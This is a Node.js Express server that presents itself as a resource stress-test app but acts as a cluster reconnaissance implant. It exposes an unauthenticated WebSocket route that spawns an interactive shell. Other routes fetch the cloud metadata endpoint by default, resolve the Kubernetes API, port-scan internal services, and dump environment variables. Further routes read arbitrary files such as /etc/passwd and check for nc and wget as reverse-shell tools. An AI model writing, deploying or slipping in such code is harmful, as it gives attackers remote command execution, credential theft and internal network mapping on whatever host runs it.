const express = require('express');
const http = require('http');
const WebSocket = require('ws');
const crypto = require('crypto');
const { spawn } = require('child_process');
const dns = require('dns');
const fs = require('fs');
const path = require('path');
const net = require('net');

const app = express();
const server = http.createServer(app);
const wss = new WebSocket.Server({ server, path: '/ws/terminal' });

app.use(express.json());
app.use(express.static('public'));

// WebSocket Terminal - Real PTY-like experience
wss.on('connection', (ws) => {
    console.log('Terminal connected');
    
    const shell = spawn('/bin/sh', ['-i'], {
        cwd: '/tmp',
        env: { 
            ...process.env, 
            TERM: 'xterm-256color',
            PS1: '\\w $ ',
            HOME: '/tmp'
        }
    });
    
    // Send shell output to client immediately
    shell.stdout.on('data', (data) => {
        if (ws.readyState === WebSocket.OPEN) {
            ws.send(JSON.stringify({ type: 'output', data: data.toString() }));
        }
    });
    
    shell.stderr.on('data', (data) => {
        if (ws.readyState === WebSocket.OPEN) {
            ws.send(JSON.stringify({ type: 'output', data: data.toString() }));
        }
    });
    
    shell.on('close', (code) => {
        if (ws.readyState === WebSocket.OPEN) {
            ws.send(JSON.stringify({ type: 'exit', code }));
        }
        ws.close();
    });
    
    // Receive input from client
    ws.on('message', (msg) => {
        try {
            const { type, data } = JSON.parse(msg);
            if (type === 'input') {
                shell.stdin.write(data);
            } else if (type === 'resize') {
                // Can't resize without PTY, but accept the message
            }
        } catch (e) {
            // Raw input fallback
            shell.stdin.write(msg.toString());
        }
    });
    
    ws.on('close', () => {
        console.log('Terminal disconnected');
        shell.kill();
    });
    
    ws.on('error', () => shell.kill());
});

// CPU Tests
app.get('/api/cpu/hash', (req, res) => {
    const iterations = parseInt(req.query.iterations) || 100000;
    let result = 'start';
    const start = Date.now();
    for (let i = 0; i < iterations; i++) {
        result = crypto.createHash('sha512').update(result + i).digest('hex');
    }
    res.json({ hash: result, iterations, time: Date.now() - start });
});

app.get('/api/cpu/prime', (req, res) => {
    const limit = parseInt(req.query.limit) || 100000;
    const start = Date.now();
    let primes = [];
    for (let n = 2; n <= limit; n++) {
        let isPrime = true;
        for (let i = 2; i <= Math.sqrt(n); i++) {
            if (n % i === 0) { isPrime = false; break; }
        }
        if (isPrime) primes.push(n);
    }
    res.json({ count: primes.length, last10: primes.slice(-10), time: Date.now() - start });
});

app.get('/api/cpu/fibonacci', (req, res) => {
    const n = parseInt(req.query.n) || 40;
    const start = Date.now();
    function fib(n) { return n <= 1 ? n : fib(n-1) + fib(n-2); }
    const result = fib(Math.min(n, 45));
    res.json({ n, result, time: Date.now() - start });
});

app.get('/api/memory/allocate', (req, res) => {
    const sizeMB = parseInt(req.query.size) || 100;
    const start = Date.now();
    const arr = new Array(sizeMB * 1024 * 1024 / 8).fill(Math.random());
    res.json({ allocatedMB: sizeMB, length: arr.length, time: Date.now() - start });
});

app.get('/api/memory/leak', (req, res) => {
    const count = parseInt(req.query.count) || 10000;
    global.leakedData = global.leakedData || [];
    for (let i = 0; i < count; i++) {
        global.leakedData.push({ data: crypto.randomBytes(1024).toString('hex'), ts: Date.now() });
    }
    res.json({ totalLeaked: global.leakedData.length, addedMB: (count * 2048) / 1024 / 1024 });
});

app.get('/api/network/fetch', async (req, res) => {
    const url = req.query.url || 'http://169.254.169.254/latest/meta-data/';
    const start = Date.now();
    try {
        const response = await fetch(url, { signal: AbortSignal.timeout(5000) });
        const text = await response.text();
        res.json({ url, status: response.status, body: text.slice(0, 2000), time: Date.now() - start });
    } catch (e) {
        res.json({ url, error: e.message, time: Date.now() - start });
    }
});

app.get('/api/network/dns', (req, res) => {
    const host = req.query.host || 'kubernetes.default.svc.cluster.local';
    dns.resolve(host, (err, addresses) => {
        res.json({ host, addresses: addresses || [], error: err?.message });
    });
});

app.get('/api/network/scan', (req, res) => {
    const host = req.query.host || '10.100.0.1';
    const ports = [80, 443, 8080, 8443, 6443, 10250, 10255, 2379, 22, 3306, 5432, 6379, 27017];
    const results = [];
    let completed = 0;
    ports.forEach(port => {
        const socket = new net.Socket();
        socket.setTimeout(1000);
        socket.on('connect', () => { results.push({ port, status: 'open' }); socket.destroy(); completed++; checkDone(); });
        socket.on('timeout', () => { results.push({ port, status: 'timeout' }); socket.destroy(); completed++; checkDone(); });
        socket.on('error', () => { results.push({ port, status: 'closed' }); completed++; checkDone(); });
        socket.connect(port, host);
    });
    function checkDone() { if (completed === ports.length) res.json({ host, results: results.sort((a,b) => a.port - b.port) }); }
});

app.get('/api/system/info', (req, res) => {
    const { execSync } = require('child_process');
    try {
        res.json({
            hostname: execSync('hostname').toString().trim(),
            kernel: execSync('uname -a').toString().trim(),
            env: process.env
        });
    } catch (e) { res.json({ error: e.message }); }
});

app.get('/api/fs/read', (req, res) => {
    const filepath = req.query.path || '/etc/passwd';
    try {
        res.json({ path: filepath, content: fs.readFileSync(filepath, 'utf8').slice(0, 5000) });
    } catch (e) { res.json({ error: e.message }); }
});

app.get('/api/fs/write', (req, res) => {
    const sizeMB = parseInt(req.query.size) || 10;
    const filename = '/tmp/stress_' + Date.now() + '.bin';
    const start = Date.now();
    fs.writeFileSync(filename, crypto.randomBytes(sizeMB * 1024 * 1024));
    res.json({ filename, sizeMB, time: Date.now() - start });
});

app.get('/api/reverse/check', (req, res) => {
    const { execSync } = require('child_process');
    try {
        res.json({
            nc: execSync('which nc 2>/dev/null || echo none').toString().trim(),
            wget: execSync('which wget 2>/dev/null || echo none').toString().trim()
        });
    } catch (e) { res.json({ error: e.message }); }
});

app.get('/api/load/concurrent', async (req, res) => {
    const count = parseInt(req.query.count) || 100;
    const start = Date.now();
    const results = await Promise.all(Array.from({length: count}, (_, i) => 
        Promise.resolve(crypto.createHash('sha256').update(String(i)).digest('hex'))
    ));
    res.json({ count, time: Date.now() - start });
});

app.get('/health', (req, res) => res.send('OK'));
app.get('*', (req, res) => res.sendFile(path.join(__dirname, 'public', 'index.html')));

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => console.log('Server on ' + PORT));
